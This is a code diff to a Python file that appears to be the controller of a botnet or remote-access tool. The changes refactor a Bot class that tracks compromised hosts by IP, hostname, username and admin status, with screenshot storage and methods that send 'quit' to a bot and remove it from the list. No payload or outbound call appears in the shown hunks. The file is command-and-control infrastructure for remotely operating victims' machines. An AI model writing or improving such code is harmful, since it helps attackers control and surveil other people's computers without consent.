@@ -6,6 +6,7 @@ import ssl
 import sys
 import time
 import threading
+from datetime import datetime
 
 # Constants
 SCREENSHOT_DIR = 'images/screenshots'
@@ -20,15 +21,21 @@ ENCODING = 'utf-8'
 
 class Bot:
     botList = {}
-    botCount = 0
-    def __init__(self,target,ip):
+    id_counter = 0
+
+    def __init__(self, target, ip):
+        Bot.id_counter += 1
+        self.id = Bot.id_counter
         self.target = target
         self.ip = ip
-        self.alias = "bot"
-        self.id = Bot.botCount
+        self.alias = None
+        self.connected_time = datetime.now()
+        self.last_seen = datetime.now()
+        self.os_type = None
+        self.hostname = None
+        self.username = None
+        self.is_admin = False
         Bot.botList[self.id] = self
-        Bot.botCount+=1
-        self.heartbeat()
 
     def send_heartbeat(self):
         pass
@@ -250,6 +257,29 @@ class Bot:
                 print(result)
 
     def kill(self):
-        self.reliable_send('quit')
-        self.target.close()
-        del Bot.botList[self.id]
+        """Properly terminate the bot and remove from list"""
+        try:
+            self.reliable_send('quit')
+            self.target.shutdown(socket.SHUT_RDWR)
+        except:
+            pass
+        finally:
+            try:
+                self.target.close()
+            except:
+                pass
+            # Always remove from botList
+            if self.id in Bot.botList:
+                del Bot.botList[self.id]
+
+    def cleanup(self):
+        """Remove bot from list without sending quit command"""
+        try:
+            self.target.shutdown(socket.SHUT_RDWR)
+            self.target.close()
+        except:
+            pass
+        finally:
+            # Always remove from botList
+            if self.id in Bot.botList:
+                del Bot.botList[self.id]
